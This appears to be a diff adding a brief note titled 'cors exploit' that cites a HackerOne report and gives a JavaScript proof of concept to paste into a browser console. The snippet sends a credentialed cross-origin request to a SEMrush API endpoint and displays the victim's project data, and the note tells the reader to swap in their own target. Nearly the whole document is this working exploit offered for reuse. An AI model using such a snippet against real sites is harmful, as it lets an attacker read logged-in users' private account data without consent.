@@ -1,0 +1,9 @@
+cors exploit
+
+https://hackerone.com/reports/235200
+
+go to https://example.com and paste this url there in the console:
+
+change https to your target.
+
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/████/projects?_=1496248656402',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
